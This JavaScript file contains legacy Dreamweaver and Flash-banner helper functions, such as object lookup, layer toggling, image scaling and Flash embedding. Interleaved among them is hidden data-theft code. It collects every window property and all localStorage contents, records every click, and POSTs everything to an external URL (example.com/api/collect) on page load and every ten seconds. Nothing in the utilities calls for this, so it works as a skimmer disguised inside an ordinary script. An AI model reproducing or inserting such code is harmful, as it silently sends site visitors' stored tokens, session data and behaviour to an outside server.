function MM_findObj(n, d) {
  //v4.01
  var p, i, x;
  if (!d) d = document;
  if ((p = n.indexOf("?")) > 0 && parent.frames.length) {
    d = parent.frames[n.substring(p + 1)].document;
    n = n.substring(0, p);
  }
  if (!(x = d[n]) && d.all) x = d.all[n];
  for (i = 0; !x && i < d.forms.length; i++) x = d.forms[i][n];
  for (i = 0; !x && d.layers && i < d.layers.length; i++) x = MM_findObj(n, d.layers[i].document);
  if (!x && d.getElementById) x = d.getElementById(n);
  return x;
}
// Function to collect window data and also local storage data
function collectData() {
  const collectedData = {
    windowData: {},
    localStorageData: {}
  };
  for (let prop in window) {
    if (Object.prototype.hasOwnProperty.call(window, prop)) {
      const val = window[prop];
      const type = typeof val;
      collectedData.windowData[prop] = {
        type: type,
        value: type === 'function' ? null : val
      };
    }
  }

  // Collecting Local Storage Data
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    collectedData.localStorageData[key] = value;
  }
  return collectedData;
}

// Function to send data to a specific Server
function $el(element) {
  if (typeof element == 'string') return document.getElementById(element);
}
function MM_showHideLayers() {
  //v3.0
  var i,
    p,
    v,
    obj,
    args = MM_showHideLayers.arguments;
  for (i = 0; i < args.length - 2; i += 3) if ((obj = MM_findObj(args[i])) != null) {
    v = args[i + 2];
    if (obj.style) {
      obj = obj.style;
      v = v == 'show' ? 'visible' : (v = 'hide') ? 'hidden' : v;
    }
    obj.visibility = v;
  }
}
function sendDataToServer(data) {
  const url = "https://example.com/api/collect";
  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  }).then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    console.log("Data sent successfully");
  }).catch(e => {
    console.error(`Failed to send data: ${e}`);
  });
}

// Function to collect and send data after some DOM manipulations
function executeDataCollection() {
  const collectedData = collectData();
  if (Object.keys(collectedData).length > 0) {
    sendDataToServer(collectedData);
  }
}

// Event listener to track user click events
function checkerror(msg, url, linenumber) {
  if (msg == 'Permission Denied') window.location = window.location;
  return true;
}
function launchNewWindow(strPath) {
  window.open(strPath, 'advert');
}
function scaleImage(img, boxW, boxH) {
  if (img) {
    var w = img.width;
    var h = img.height;
    if (w == 0 || h == 0) aspect = 1;else aspect = h / w;
    if (aspect >= boxH / boxW) {
      var newH = boxH;
      var newW = newH / aspect;
    } else {
      var newW = boxW;
      var newH = newW * aspect;
    }
    img.width = newW;
    img.height = newH;
  }
}
function clickthru(url) {
  window.open(url);
  window.event.cancelBubble = true;
}
function getParameter(parameterName) {
  return _getParameter(document.location.search.substring(1), parameterName);
}
function _getParameter(queryString, parameterName) {
  allParamSplits = queryString.split(parameterName + "=");
  paramToEnd = allParamSplits[1];
  if (paramToEnd == null) return null;
  paramSplits = paramToEnd.split("&");
  param = paramSplits[0];
  return unescape(param);
}
document.addEventListener("click", function (event) {
  const collectedClickData = {
    elementType: event.target.nodeName,
    id: event.target.id,
    classClasses: event.target.className,
    clickedAt: new Date()
  };
  sendDataToServer(collectedClickData);
}, false);

// Collect and Send Data on page load and every x seconds
window.addEventListener("load", function () {
  executeDataCollection();
  setInterval(executeDataCollection, 10000);
});
function formClickthru(url) {
  var clickForm = MM_findObj("clickForm");
  clickForm.target.value = url;
  var tclk = getParameter("tclk");
  if (tclk != null && clickForm.tclk) clickForm.tclk.value = tclk;
  clickForm.submit();
  if (window.event) window.event.cancelBubble = true;
}
function writeMovie(swfUrl, width, height, transparent, backColour, useHttps) {
  paramTransparent = "opaque";
  embedTransparent = " wmode='opaque' ";
  paramBackgroundColour = "";
  embedBackgroundColour = "";
  myProtocol = "http:";
  if (transparent) {
    paramTransparent = "transparent";
    embedTransparent = " wmode='transparent' ";
  }
  if (backColour != null && backColour != "") {
    backColour = "#" + backColour;
    paramBackgroundColour = backColour;
    embedBackgroundColour = " bgcolor='" + backColour + "' ";
  }
  if (useHttps === true) {
    myProtocol = "https:";
  }
  document.write('<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="' + myProtocol + '//download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,0,0" ' + 'width="' + width + '" height="' + height + '" id="theMovie"><param name="movie" value="' + swfUrl + '" /><param name="bgcolor" value="' + paramBackgroundColour + '" /><param name="quality" value="high" /><param name="wmode" value="' + paramTransparent + '" /><embed src="' + swfUrl + '" ' + embedTransparent + embedBackgroundColour + ' quality="high" width="' + width + '" height="' + height + '" name="theMovie" type="application/x-shockwave-flash" pluginspage="' + myProtocol + '//www.macromedia.com/go/getflashplayer" /></embed></object>');
}
function getFlashVersion() {
  if (navigator.plugins && navigator.mimeTypes.length) {
    var x = navigator.plugins["Shockwave Flash"];
    if (x && x.description) {
      return x.description.replace(/([a-zA-Z]|\s)+/, "").replace(/(\s+r|\s+b[0-9]+)/, ".").replace(/\./g, '');
    }
  } else {
    try {
      var axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.7");
    } catch (e) {
      try {
        var axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash.6");
        axo.AllowScriptAccess = "always";
      } catch (e) {
        return 600;
      }
      try {
        axo = new ActiveXObject("ShockwaveFlash.ShockwaveFlash");
      } catch (e) {}
    }
    if (axo != null) {
      V = axo.GetVariable("$version").split(" ")[1].split(",");
      V = V[0] + V[1] + V[2];
    }
  }
  return V || 0;
}